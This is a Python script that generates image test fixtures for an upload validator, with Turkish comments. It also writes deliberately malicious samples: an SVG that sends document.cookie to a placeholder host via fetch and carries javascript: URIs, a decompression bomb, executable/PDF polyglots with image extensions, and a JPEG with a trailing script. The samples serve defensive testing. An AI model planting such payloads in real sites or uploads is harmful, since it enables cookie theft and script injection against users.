#!/usr/bin/env python3
"""T-006 — Golden fixture korpusu: görsel + kötücül dosya üreteci.

Yalnız Pillow kullanır (yerel makinede Pillow 11.3.0 kurulu, numpy YOK).
Çıktı:
    tests/fixtures/media/images/     — geçerli / sınır zorlayan görseller
    tests/fixtures/malicious/        — kötücül / bozuk dosyalar (AYRI dizin)

Bu betik dosyaları ÜRETİR. Ölçüm ve manifest yazımı ayrı betiktedir
(scripts/verify_fixtures.py) — böylece manifest'teki hiçbir sayı elle
yazılmaz, üretilen dosyadan okunur.

Yeniden üretim:
    python3 scripts/gen_fixtures_images.py
"""

from __future__ import annotations

import io
import struct
import sys
import zipfile
from pathlib import Path

from PIL import Image, ImageCms, ImageDraw, ImageFilter
from PIL.TiffImagePlugin import IFDRational

# 100 MP bombayı biz üretiyoruz; Pillow'un kendi 89,5 MP koruması üretimi keser.
Image.MAX_IMAGE_PIXELS = None

ROOT = Path(__file__).resolve().parents[1]
# 1ec9b5e göçü sonrası gerçek yol (W9 T-032 düzeltmesi, 2026-08-20)
IMG = ROOT / "tradehub_core" / "tests" / "fixtures" / "media" / "images"
MAL = ROOT / "tradehub_core" / "tests" / "fixtures" / "malicious"

for d in (IMG, MAL):
    d.mkdir(parents=True, exist_ok=True)


# --------------------------------------------------------------------------
# içerik üreticileri (numpy yok — her şey Pillow ilkelleriyle)
# --------------------------------------------------------------------------

def _lcg(seed: int):
    """Deterministik sözde-rastgele üretici. random modülünün sürüm/platform
    farklarına bağlı kalmamak için sabit bir LCG kullanıyoruz: fixture'lar
    her makinede bit-bit aynı çıksın."""
    state = seed & 0xFFFFFFFF
    while True:
        state = (1103515245 * state + 12345) & 0x7FFFFFFF
        yield state


def foto(w: int, h: int, seed: int = 7, detay: float = 0.35) -> Image.Image:
    """Fotoğraf benzeri içerik: düşük frekanslı renk alanları + kontrollü
    yüksek frekanslı doku. `detay` arttıkça JPEG dosyası büyür — P-01
    vakasında hedef bayta oturtmak için bu kolu kullanıyoruz."""
    kh = max(8, min(96, w // 24))
    kv = max(8, min(96, h // 24))
    kucuk = Image.new("RGB", (kh, kv))
    px = kucuk.load()
    rnd = _lcg(seed)
    for y in range(kv):
        for x in range(kh):
            px[x, y] = (
                (next(rnd) % 200) + 40,
                (next(rnd) % 200) + 40,
                (next(rnd) % 200) + 40,
            )
    taban = kucuk.resize((w, h), Image.BICUBIC).filter(
        ImageFilter.GaussianBlur(radius=max(1, min(w, h) // 200))
    )
    if detay <= 0:
        return taban
    # effect_noise tek kanallı; üç kanala yayıp harmanlıyoruz.
    gurultu = Image.merge(
        "RGB",
        [
            Image.effect_noise((w, h), 28 + i * 4).convert("L")
            for i in range(3)
        ],
    )
    return Image.blend(taban, gurultu, detay)


def urun(w: int, h: int, kenar_bosluk: float = 0.12, seed: int = 3,
         detay: float = 0.15) -> Image.Image:
    """Beyaz zeminde ortalanmış ürün: `kenar_bosluk` oranında düz beyaz
    çerçeve bırakır. border_ratio kuralını ölçmek için."""
    im = Image.new("RGB", (w, h), (255, 255, 255))
    d = ImageDraw.Draw(im)
    bx = int(w * kenar_bosluk)
    by = int(h * kenar_bosluk)
    ic = foto(max(1, w - 2 * bx), max(1, h - 2 * by), seed=seed, detay=detay)
    im.paste(ic, (bx, by))
    d.rectangle([bx, by, w - bx - 1, h - by - 1], outline=(20, 20, 20), width=3)
    return im


def logo(w: int, h: int, alfa: bool = True) -> Image.Image:
    """Saydam zeminli, düz renkli, keskin kenarlı marka işareti."""
    mod = "RGBA" if alfa else "RGB"
    zemin = (0, 0, 0, 0) if alfa else (255, 255, 255)
    im = Image.new(mod, (w, h), zemin)
    d = ImageDraw.Draw(im)
    m = min(w, h)
    d.ellipse(
        [w // 2 - m // 3, h // 2 - m // 3, w // 2 + m // 3, h // 2 + m // 3],
        fill=(11, 87, 164, 255) if alfa else (11, 87, 164),
    )
    d.rectangle(
        [w // 2 - m // 8, h // 2 - m // 8, w // 2 + m // 8, h // 2 + m // 8],
        fill=(255, 255, 255, 255) if alfa else (255, 255, 255),
    )
    return im


def jpeg_hedef_bayt(im: Image.Image, yol: Path, hedef: int, **kw) -> int:
    """Kaliteyi ikili aramayla hedef bayta yaklaştırır. P-01 fixture'ı
    '18 MP ama ~1 MB' olmak zorunda; kaliteyi elle seçmek yerine ölçüyoruz."""
    alt, ust = 5, 95
    en_iyi = None
    for _ in range(9):
        q = (alt + ust) // 2
        buf = io.BytesIO()
        im.save(buf, "JPEG", quality=q, optimize=True, **kw)
        n = buf.tell()
        if en_iyi is None or abs(n - hedef) < abs(en_iyi[0] - hedef):
            en_iyi = (n, q, buf.getvalue())
        if n > hedef:
            ust = q - 1
        else:
            alt = q + 1
        if alt > ust:
            break
    yol.write_bytes(en_iyi[2])
    return en_iyi[1]


def yaz(ad: str, im: Image.Image, **kw) -> None:
    yol = IMG / ad
    im.save(yol, **kw)
    print(f"  {ad:<38} {yol.stat().st_size:>10,} B")


# --------------------------------------------------------------------------
# A) sentetik görseller
# --------------------------------------------------------------------------

def gorseller() -> None:
    print("[A] sentetik görseller")

    # 1 — P-01: 18 MP ama ~1 MB. Canlıda >20 MP 179 dosya var (08 §1.3).
    im = foto(5184, 3456, seed=11, detay=0.10)
    q = jpeg_hedef_bayt(im, IMG / "p01_18mp_1mb.jpg", 1_048_576, progressive=False)
    print(f"  p01_18mp_1mb.jpg                       q={q} "
          f"{(IMG / 'p01_18mp_1mb.jpg').stat().st_size:,} B")
    del im

    # 2 — 3000x3000 @300 DPI TIFF. dpi-ve-cozunurluk.md'nin DOĞRU/YASAK vakası.
    im = foto(3000, 3000, seed=21, detay=0.0)
    yaz("dpi_3000x3000_300dpi.tif", im, format="TIFF",
        dpi=(300, 300), compression="tiff_deflate")
    del im

    # 3 — CMYK JPEG (canlıda 38 adet).
    im = foto(1600, 1600, seed=31, detay=0.25).convert("CMYK")
    yaz("mode_cmyk.jpg", im, format="JPEG", quality=85)
    del im

    # 4 — alfa kanallı PNG (canlıda 597 adet).
    im = logo(1200, 1200, alfa=True)
    yaz("mode_rgba_alpha.png", im, format="PNG")

    # 5 — paletli (P) PNG (canlıda 74 adet).
    im = foto(1200, 1200, seed=41, detay=0.30).convert(
        "P", palette=Image.ADAPTIVE, colors=64)
    yaz("mode_palette_p.png", im, format="PNG")
    del im

    # 6 — gri tonlama (L) (canlıda 7 adet).
    im = foto(1400, 1400, seed=51, detay=0.06).convert("L")
    yaz("mode_grayscale_l.png", im, format="PNG")
    del im

    # 7 — 400x4000 dikey şerit: oran 1:10, hiçbir slotun bandında değil.
    im = foto(400, 4000, seed=61, detay=0.05)
    yaz("geom_strip_400x4000.png", im, format="PNG")
    del im

    # 8 — 1x1 piksel.
    yaz("geom_1x1.png", Image.new("RGB", (1, 1), (255, 0, 0)), format="PNG")

    # 9 — EXIF orientation 6. SIRALAMA testi: saklanan 1200x1600 (oran 0,75 =
    #     3:4, product.image bandında KABUL), gösterilen 1600x1200 (oran 1,333,
    #     bantta YOK → RET). Oranı transpose ÖNCESİ ölçen bir uygulama bu
    #     dosyayı yanlışlıkla kabul eder. Ok yukarı bakıyor: doğru işlenmişse
    #     çıktıda sağa bakar.
    im = Image.new("RGB", (1200, 1600), (240, 240, 240))
    d = ImageDraw.Draw(im)
    d.polygon([(600, 160), (900, 700), (300, 700)], fill=(200, 30, 30))
    d.rectangle([510, 700, 690, 1440], fill=(200, 30, 30))
    exif = Image.Exif()
    exif[0x0112] = 6  # Orientation
    exif[0x010F] = "ISTOC-FIXTURE"
    im.save(IMG / "exif_orientation6.jpg", "JPEG", quality=90, exif=exif)
    print(f"  exif_orientation6.jpg                  "
          f"{(IMG / 'exif_orientation6.jpg').stat().st_size:,} B")

    # 10 — EXIF GPS: FR-039 (GPS silinmeli) için kanıt dosyası.
    im = foto(1600, 1600, seed=71, detay=0.30)
    exif = Image.Exif()
    exif[0x0110] = "ISTOC-FIXTURE-CAM"
    gps = exif.get_ifd(0x8825)
    gps[0] = b"\x02\x03\x00\x00"
    gps[1] = "N"
    gps[2] = (IFDRational(41, 1), IFDRational(1, 1), IFDRational(2340, 100))
    gps[3] = "E"
    gps[4] = (IFDRational(28, 1), IFDRational(58, 1), IFDRational(1200, 100))
    im.save(IMG / "exif_gps.jpg", "JPEG", quality=88, exif=exif)
    print(f"  exif_gps.jpg                           "
          f"{(IMG / 'exif_gps.jpg').stat().st_size:,} B")
    del im

    # 11 — progressive JPEG.
    im = foto(1800, 1800, seed=81, detay=0.30)
    yaz("enc_progressive.jpg", im, format="JPEG", quality=85, progressive=True)
    del im

    # 12 — animasyonlu GIF (allow_animated=false → reject).
    kareler = []
    for i in range(6):
        k = Image.new("RGB", (600, 600), (250, 250, 250))
        d = ImageDraw.Draw(k)
        d.ellipse([60 + i * 60, 240, 180 + i * 60, 360], fill=(20, 120, 200))
        kareler.append(k.convert("P", palette=Image.ADAPTIVE, colors=32))
    kareler[0].save(IMG / "anim_6frames.gif", save_all=True,
                    append_images=kareler[1:], duration=120, loop=0)
    print(f"  anim_6frames.gif                       "
          f"{(IMG / 'anim_6frames.gif').stat().st_size:,} B")

    # 13 — animasyonlu WebP: uzantı görsel allowlist'inde ama animasyon yasak.
    kareler_rgb = [k.convert("RGB") for k in kareler]
    kareler_rgb[0].save(IMG / "anim_webp.webp", save_all=True,
                        append_images=kareler_rgb[1:], duration=120, loop=0)
    print(f"  anim_webp.webp                         "
          f"{(IMG / 'anim_webp.webp').stat().st_size:,} B")

    # 14 — WebP kayıplı.
    im = foto(1600, 1600, seed=91, detay=0.30)
    yaz("enc_webp_lossy.webp", im, format="WEBP", quality=80)
    # 15 — WebP kayıpsız (logo merdiveni bunu istiyor: FR-038).
    yaz("enc_webp_lossless.webp", logo(1024, 1024, alfa=True),
        format="WEBP", lossless=True)
    del im

    # 16 — kısa kenar 32 (canlıdaki minimum, 08 §1.2).
    yaz("edge_short32.jpg", foto(32, 48, seed=101, detay=0.4),
        format="JPEG", quality=90)

    # 17 — kısa kenar 4480 (canlıdaki p99).
    im = foto(4480, 5600, seed=111, detay=0.12)
    yaz("edge_short4480.jpg", im, format="JPEG", quality=78, optimize=True)
    del im

    # 18 — 72,71 MP (canlıdaki maksimum). 8527^2 = 72.709.729 px.
    im = foto(8527, 8527, seed=121, detay=0.06)
    yaz("edge_72mp.jpg", im, format="JPEG", quality=60, optimize=True)
    del im

    # 19/20 — min_short_edge=1000 sınırının iki yakası (FR-015: >= geçerli).
    yaz("bound_short999.jpg", foto(999, 999, seed=131, detay=0.3),
        format="JPEG", quality=85)
    yaz("bound_short1000.jpg", foto(1000, 1000, seed=132, detay=0.3),
        format="JPEG", quality=85)

    # 21 — 2400x2400: product.image master hedefi (max_long_edge).
    im = foto(2400, 2400, seed=141, detay=0.25)
    yaz("ok_product_1x1_2400.jpg", im, format="JPEG", quality=85, optimize=True)
    del im

    # 22 — 4:5 kabul bandı (2000x2500).
    im = foto(2000, 2500, seed=151, detay=0.25)
    yaz("ok_product_4x5.jpg", im, format="JPEG", quality=82, optimize=True)
    del im

    # 23 — logo: alfa + 1:1 + kayıpsız (FR-019/FR-020/FR-038).
    yaz("logo_alpha_512.png", logo(512, 512, alfa=True), format="PNG")

    # 24 — logo: JPEG, alfa YOK. Canlıda logoların %50'si böyle (08 §2.1) →
    #      K1 kararı "kabul + uyarı".
    yaz("logo_jpeg_noalpha.jpg", logo(600, 600, alfa=False),
        format="JPEG", quality=90)

    # 25 — logo: oran 2,876 (canlıda ölçülen band dışı iki kelime markası).
    yaz("logo_wordmark_2876.png", logo(1438, 500, alfa=True), format="PNG")

    # 26 — logo: kısa kenar 200 (canlıdaki en küçük gerçek logo).
    yaz("logo_short200.png", logo(200, 200, alfa=True), format="PNG")

    # 27 — company.cover_image: 24:5 önerisi (2400x500).
    im = foto(2400, 500, seed=161, detay=0.25)
    yaz("ok_cover_24x5.jpg", im, format="JPEG", quality=82, optimize=True)
    del im

    # 28 — category.banner: 2:1 önerisi (2000x1000).
    im = foto(2000, 1000, seed=171, detay=0.25)
    yaz("ok_banner_2x1.jpg", im, format="JPEG", quality=82, optimize=True)
    del im

    # 29 — user.avatar: 96x96, 1:1 (kabul tabanı).
    yaz("ok_avatar_96.png", logo(96, 96, alfa=False), format="PNG")

    # 30 — boş/tek renk: entropy_bits < 2.0 kuralı (blank).
    yaz("content_blank_white.png", Image.new("RGB", (1200, 1200),
        (255, 255, 255)), format="PNG")

    # 31 — aşırı kenar boşluğu: border_ratio > 0.25 (auto_fix).
    yaz("content_border_40pct.png", urun(1400, 1400, kenar_bosluk=0.40, seed=181),
        format="PNG")

    # 32 — normal kenar boşluğu: aynı kuralın NEGATİF kontrolü.
    yaz("content_border_08pct.png", urun(1400, 1400, kenar_bosluk=0.08, seed=182),
        format="PNG")

    # 33 — gömülü ICC profili (master.strip_metadata.icc = false).
    im = foto(1600, 1600, seed=191, detay=0.28)
    icc = ImageCms.ImageCmsProfile(ImageCms.createProfile("sRGB")).tobytes()
    im.save(IMG / "icc_srgb_embedded.jpg", "JPEG", quality=85, icc_profile=icc)
    print(f"  icc_srgb_embedded.jpg                  "
          f"{(IMG / 'icc_srgb_embedded.jpg').stat().st_size:,} B")
    del im

    # 34 — TIFF, canlıda 11 adet var; JPEG/PNG/WEBP dışı tek biçim.
    im = foto(1500, 1500, seed=201, detay=0.0)
    yaz("fmt_tiff_lzw.tif", im, format="TIFF", compression="tiff_lzw")
    del im


# --------------------------------------------------------------------------
# B) kötücül / bozuk dosyalar — AYRI dizin
# --------------------------------------------------------------------------

def kotucul() -> None:
    print("[B] kötücül / bozuk dosyalar")

    def rapor(ad: str) -> None:
        print(f"  {ad:<38} {(MAL / ad).stat().st_size:>10,} B")

    # 1 — decompression bomb: 100 MP, küçük dosya.
    #     accept.max_megapixels_hard = 80 → istisnasız reddedilmeli (FR-011).
    bomba = Image.new("L", (10000, 10000), 0)
    d = ImageDraw.Draw(bomba)
    d.rectangle([0, 0, 9999, 40], fill=255)  # tamamen düz olmasın
    bomba.save(MAL / "bomb_100mp.png", "PNG", optimize=True)
    del bomba
    rapor("bomb_100mp.png")

    # 2 — script içeren SVG (FR-014 / FR-119: SVG bugün reddedilmeli).
    (MAL / "script_payload.svg").write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" '
        'viewBox="0 0 512 512" onload="alert(1)">\n'
        '  <script type="text/javascript">'
        'fetch("https://ornek.gecersiz/c?k="+document.cookie)</script>\n'
        '  <image href="https://ornek.gecersiz/izleyici.png" x="0" y="0"/>\n'
        '  <foreignObject width="512" height="512">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<iframe src="javascript:alert(2)"></iframe></body></foreignObject>\n'
        '  <a xlink:href="javascript:alert(3)"><rect width="512" height="512" '
        'fill="#0b57a4"/></a>\n'
        '</svg>\n',
        encoding="utf-8",
    )
    rapor("script_payload.svg")

    # 3 — polyglot: .jpg uzantısı, içerik PDF (FR-009 magic-byte).
    pdf = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
           b"2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n"
           b"trailer<</Root 1 0 R>>\n%%EOF\n")
    (MAL / "polyglot_pdf_as.jpg").write_bytes(pdf + b"\x00" * 512)
    rapor("polyglot_pdf_as.jpg")

    # 4 — polyglot: .jpg uzantısı, içerik gerçek PNG. Uzantı/içerik uyuşmazlığı
    #     ama içerik yine de geçerli bir görsel → "uzantıya güvenme" vakası.
    buf = io.BytesIO()
    logo(256, 256, alfa=True).save(buf, "PNG")
    (MAL / "polyglot_png_as.jpg").write_bytes(buf.getvalue())
    rapor("polyglot_png_as.jpg")

    # 5 — 0 bayt dosya. Canlıda 0 adet (08 §1.3) ama L0 bunu ele almalı.
    (MAL / "empty_zero_byte.jpg").write_bytes(b"")
    rapor("empty_zero_byte.jpg")

    # 6 — yarım/bozuk JPEG: geçerli başlık, veri %40'ta kesik.
    buf = io.BytesIO()
    foto(1600, 1200, seed=211, detay=0.35).save(buf, "JPEG", quality=88)
    tam = buf.getvalue()
    (MAL / "truncated.jpg").write_bytes(tam[: int(len(tam) * 0.4)])
    rapor("truncated.jpg")

    # 7 — DOCX beyan eden ama içi DOCX olmayan ZIP (FR-010).
    with zipfile.ZipFile(MAL / "fake_docx.docx", "w") as z:
        z.writestr("merhaba.txt", "bu bir docx degil")
        z.writestr("dizin/veri.bin", b"\x00" * 128)
    rapor("fake_docx.docx")

    # 8 — .png uzantılı Windows çalıştırılabiliri (MZ imzası).
    (MAL / "executable_as.png").write_bytes(
        b"MZ" + struct.pack("<H", 0x90) + b"\x00" * 58
        + b"This program cannot be run in DOS mode.\r\n" + b"\x00" * 256
    )
    rapor("executable_as.png")

    # 9 — data: URI. Canlıda 18 logo kaydı tam olarak böyle duruyor
    #     (08 §2, hepsi demo seed) → FR-013 medya alanına data: yazılmamalı.
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
           b'<rect width="64" height="64" fill="#0b57a4"/></svg>')
    import base64
    (MAL / "data_uri_svg.txt").write_bytes(
        b"data:image/svg+xml;base64," + base64.b64encode(svg) + b"\n")
    rapor("data_uri_svg.txt")

    # 10 — geçerli JPEG başlığı + gövdede HTML/JS. Sunucu "JPEG" der,
    #      tarayıcı yanlış Content-Type ile servis edilirse çalıştırır.
    buf = io.BytesIO()
    foto(320, 320, seed=221, detay=0.3).save(buf, "JPEG", quality=70)
    (MAL / "jpeg_with_html_tail.jpg").write_bytes(
        buf.getvalue() + b"<html><script>alert(1)</script></html>")
    rapor("jpeg_with_html_tail.jpg")


if __name__ == "__main__":
    gorseller()
    kotucul()
    print("bitti", file=sys.stderr)
